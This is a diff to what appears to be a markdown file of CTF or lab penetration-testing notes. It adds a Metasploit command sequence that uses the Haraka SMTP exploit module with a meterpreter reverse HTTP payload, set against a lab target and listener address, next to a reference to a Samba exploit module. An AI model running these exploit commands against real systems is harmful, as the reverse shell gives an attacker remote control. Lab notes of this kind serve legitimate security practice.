@@ -552,7 +552,13 @@ use exploit/linux/samba/is_known_pipename
   - https://arben.sh/ctf7e4/ctf7e4-Machines-HARP/
 
 ```
-To review thoroughly...
+use exploit/linux/smtp/haraka
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set RHOST 192.150.137.3
+set LHOST 192.150.137.2
+exploit
 ```
 
 ## SSH
